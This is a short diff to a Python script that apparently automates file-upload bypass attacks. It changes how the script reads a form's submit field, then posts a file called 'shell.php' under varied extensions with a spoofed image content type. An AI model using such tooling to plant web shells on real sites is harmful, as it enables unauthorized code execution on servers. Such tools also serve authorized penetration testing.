@@ -125,6 +125,19 @@ def attributes(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brut
                 if "name" in j:
                     file_attr = j[j.find(start_name) + len(start_name):j.rfind(end_name)]
 
+        if 'submit' in i:
+            attribute = str(i)
+            attribute = attribute.split(" ")
+
+            for j in attribute:
+
+                if "name" in j:
+                    name = j[j.find(start_value) + len(start_value):j.rfind(end_value)]
+
+            attribute_dictionary = "{" + '"' + str(name) + '"' + ": " + '"' + "submit" + '"' + "}"
+            submit = json.loads(attribute_dictionary)
+            data.update(submit)
+
     file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity, location,
                    session, file_attr, data)
 
@@ -165,7 +178,6 @@ def file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, 
             filename_ext = filename.replace("shell.php", f"shell{ext}")
             files = {
                 f'{file_attr}': (filename_ext, open(filename, 'rb'), 'image/jpeg'),
-                'submit': (None, 'submit')
             }
 
             response = session.post(URL, files=files, headers=headers, data=data, proxies=proxies,
